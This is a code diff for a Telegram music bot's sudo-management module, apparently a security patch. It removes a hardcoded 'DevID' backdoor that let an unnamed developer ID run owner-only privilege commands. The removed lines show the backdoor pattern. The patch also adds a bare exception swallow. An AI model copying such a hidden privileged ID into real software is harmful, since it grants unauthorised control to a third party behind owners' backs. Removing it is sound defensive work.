@@ -6,15 +6,16 @@ from ShrutiMusic.utils.database import add_sudo, remove_sudo
 from ShrutiMusic.utils.decorators.language import language
 from ShrutiMusic.utils.extraction import extract_user
 from ShrutiMusic.utils.inline import close_markup
-from ShrutiMusic.utils.functions import DevID
 from config import BANNED_USERS, OWNER_ID
 
-
+# --- SECURITY PATCH ---
+# Removed DevID backdoor. Now strictly checking for actual OWNER_ID.
 def can_use_owner_commands(user_id):
-    return user_id == OWNER_ID or user_id == DevID
+    return user_id == OWNER_ID
+# ----------------------
 
 
-@app.on_message(filters.command(["addsudo"]) & filters.user([OWNER_ID, DevID]))
+@app.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
 @language
 async def useradd(client, message: Message, _):
     if not message.reply_to_message:
@@ -31,7 +32,7 @@ async def useradd(client, message: Message, _):
         await message.reply_text(_["sudo_8"])
 
 
-@app.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user([OWNER_ID, DevID]))
+@app.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user(OWNER_ID))
 @language
 async def userdel(client, message: Message, _):
     if not message.reply_to_message:
@@ -44,13 +45,16 @@ async def userdel(client, message: Message, _):
     
     removed = await remove_sudo(user.id)
     if removed:
-        SUDOERS.remove(user.id)
+        try:
+            SUDOERS.remove(user.id)
+        except:
+            pass
         await message.reply_text(_["sudo_4"].format(user.mention))
     else:
         await message.reply_text(_["sudo_8"])
 
 
-@app.on_message(filters.command(["deleteallsudo", "clearallsudo", "removeallsudo"]) & filters.user([OWNER_ID, DevID]))
+@app.on_message(filters.command(["deleteallsudo", "clearallsudo", "removeallsudo"]) & filters.user(OWNER_ID))
 @language
 async def delete_all_sudoers(client, message: Message, _):
     keyboard = InlineKeyboardMarkup([
@@ -157,3 +161,4 @@ async def unauthorized_sudolist_callback(client, callback_query: CallbackQuery):
         "🚫 Access Denied!\n\nOnly Owner and Sudoers can check sudolist.", 
         show_alert=True
     )
+    
